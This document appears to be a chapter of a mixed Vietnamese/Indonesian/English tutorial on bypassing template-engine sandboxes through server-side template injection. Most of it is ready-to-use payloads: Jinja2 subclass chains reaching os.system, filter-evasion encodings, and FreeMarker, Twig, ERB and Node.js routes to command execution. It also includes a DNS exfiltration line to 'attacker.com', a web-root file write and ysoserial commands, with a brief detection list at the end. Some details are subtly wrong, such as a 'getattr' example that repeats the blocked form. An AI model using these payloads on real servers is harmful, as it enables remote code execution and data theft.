# 19 - Sandbox Bypass Techniques

## Tổng Quan

Sandbox trong template engine là mechanism để restrict các operations nguy hiểm. Tapi sandbox thường bisa di-bypass thông qua object introspection, prototype pollution, hoặc gadget chains.

## Bypass Phương Pháp

### Python Template Engines - Object Introspection Chain

#### Problem: `__import__` Blocked

**Jinja2/Django Template**

```python
# Direct access blocked
{{ __import__('os').system('id') }}  # Blocked

# Bypass via object.__class__
{{ ''.__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['os'].system('id') }}
```

**How it works:**

```
Step 1: String object
    {{ '' }}                    → <class 'str'>

Step 2: Access string's class
    {{ ''.__class__ }}          → str

Step 3: Get base classes
    {{ ''.__class__.__bases__ }} → (object,)

Step 4: Get base object's subclasses
    {{ ''.__class__.__bases__[0].__subclasses__() }}
    → [List of all subclasses in Python]

Step 5: Find dangerous subclass (usually subprocess.Popen)
    {{ ''.__class__.__bases__[0].__subclasses__()[104] }}
    → <class 'subprocess.Popen'>  (Index varies)

Step 6: Access __init__.__globals__
    → All module globals including 'os'

Step 7: Execute
    {{ [...][104].__init__.__globals__['os'].system('id') }}
```

#### Finding Correct Index

Index dalam `__subclasses__()` bervariasi antar Python version. Script untuk menemukan:

```python
# Find subprocess or dangerous classes
subclasses = ''.__class__.__bases__[0].__subclasses__()
for i, subclass in enumerate(subclasses):
    if 'Popen' in str(subclass):
        print(f"Index {i}: {subclass}")
```

#### Alternative: List Comprehension untuk Find

```jinja2
{%set subclasses=''.__class__.__bases__[0].__subclasses__()%}
{%for cls in subclasses%}
{%if 'Popen' in str(cls)%}
Found at {{loop.index0}}: {{cls}}
{%endif%}
{%endfor%}
```

### Filter Bypass - Using `getattr` atau `attr` Filter

Ketika `__` (dunder attributes) difilter:

**Jinja2:**

```jinja2
# Original (might be blocked)
{{ cycler.__init__.__globals__ }}

# Using attr filter
{{ cycler|attr('__init__')|attr('__globals__') }}

# Using getattr
{{ cycler.__init__.__globals__ }}

# Obfuscated dengan attribute name as string
{{ cycler|attr('__init__')|attr('__globals__')['os'].system('id') }}
```

### String Encoding untuk Bypass Filters

#### Hex Encoding

```python
# '\x6f\x73' = 'os'
__import__('\x6f\x73').system('whoami')
```

#### Format String

```python
# Using format
'{0:s}'.format('__import__')

# String join
'__' + 'import' + '__'
```

#### Unicode/Unicode Escapes

```python
# Various encodings
__import__('\N{LATIN SMALL LETTER O}\N{LATIN SMALL LETTER S}')
```

#### URL Encoding (Context-dependent)

```python
%5F%5Fimport%5F%5F  → __import__
```

### Jinja2 Filter Bypass dengan Custom Filter

Jika custom filter terdaftar:

```jinja2
# Assuming 'system' filter exists
{{ "id" | system }}

# Or chain filters
{{ "id" | safe | system }}
```

### Escaping Underscore Filters

Beberapa WAF filter underscore. Alternatives:

```python
# Using getattr
getattr(os, 'system')('id')

# Using str methods
str(os).split("module '")[1].split("'")[0]  # Extract module name

# Using dir()
[x for x in dir(os) if 'system' in x]
```

## Java Sandbox Bypass

### FreeMarker SAFER_RESOLVER Bypass

#### Method 1: ObjectConstructor (Older Version)

```freemarker
<#assign objCtor=springMacroRequestContext.webApplicationContext.getBean("mvcConversionService").classes>
<#assign clazz=objCtor.forName("java.lang.Runtime")>
```

#### Method 2: Via Script (JSP Context)

Jika JSP engine tersedia:

```java
// FreeMarker can interact dengan JSP
<%= Runtime.getRuntime().exec("id") %>
```

### Java Reflection Chain

```freemarker
<#assign classLoader="".class.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign method=clazz.getMethod("getRuntime")>
<#assign runtime=method.invoke(null)>
<#assign method=clazz.getMethod("exec", classLoader.loadClass("[Ljava/lang/String;"))>
${method.invoke(runtime, ["/bin/sh", "-c", "id"])}
```

## PHP Sandbox Bypass (Twig)

### Exploit Filter Registration

```php
// PHP code that registers filter
$twig->addFilter('system', new TwigFilter('system'));

// Attacker payload
{{ "id" | system }}
```

### If registerUndefinedFilterCallback Available

```twig
{{ _self.env.registerUndefinedFilterCallback("exec")("whoami") }}
```

### Alternative: Via Reflection

```twig
{%set clazz=_self.env.getFilter("_").__closure__.getVariable(0).__self__.__class__%}
```

## Ruby Sandbox Bypass (ERB)

### Direct Method Call via send

```erb
<%= self.send(:system, 'id') %>
<%= Object.const_get('Kernel').send(:system, 'id') %>
```

### Using eval dengan limited context

```erb
<%
code = "system('id')"
eval(code)  # Dangerous!
%>
```

## JavaScript/Node.js Sandbox Bypass

### Require dalam Sandbox

```javascript
// Even dalam sandboxed environment
require("child_process").exec("id");
```

### Proto Pollution

```javascript
// Object.prototype pollution
__proto__.constructor.prototype.system = require("child_process").exec;
```

## Generic Bypass Patterns

### Pattern 1: Time-Delay untuk confirm execution

```
Payload: {{7*7==49 and sleep(5) or ''}}
Monitor: Response time
If delay 5s → RCE confirmed, WAF/Sandbox bypass successful
```

### Pattern 2: Write to Web Root

```
Payload: {{open('/var/www/html/pwned.txt','w').write('success')}}
Check: File exists via HTTP request
```

### Pattern 3: DNS Exfiltration

```python
__import__('socket').gethostbyname('attacker.com')
# Monitor: DNS query received at attacker.com?
```

## Common Gadget Chains

### For Python

**Subprocess via Popen:**

```
'' → __class__ → __bases__[0] → __subclasses__()[X] → Popen
```

**OS via sys.modules:**

```
sys.modules → os module → os.system()
```

### For Java

**Runtime via Reflection:**

```
Class.forName("java.lang.Runtime")
  → getMethod("getRuntime")
  → invoke()
  → exec()
```

### For PHP

**system via function_exists + call_user_func:**

```php
call_user_func('system', 'id')
```

## Detection dan Prevention Bypass

### Detecting Bypass Attempts

Logs untuk monitor:

- Unusual `__` attribute access
- Repeated errors dengan different payloads
- Timing anomalies (time-based)
- File creation in unexpected locations

### Preventing Bypass

1. **Use unsandboxed engine jika aman**
2. **Update template engine ke latest version**
3. **Test sandbox dengan known gadgets**
4. **Implement additional validation layer**
5. **Use security scanning tools (ysoserial, etc)**
6. **Run dalam container/VM dengan limited access**

## Tools untuk Gadget Discovery

### Ysoserial (Java)

```bash
ysoserial [gadget-chain] [command] > payload.bin
ysoserial CommonsCollections5 'id' | base64
```

### PayloadsAllTheThings

GitHub repo dengan payloads update:

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
```

## Tài Liệu Liên Quan

- [04-exploitation-techniques.md](04-exploitation-techniques.md) - Kỹ thuật khai thác
- [20-defense-mitigation.md](20-defense-mitigation.md) - Phòng chống
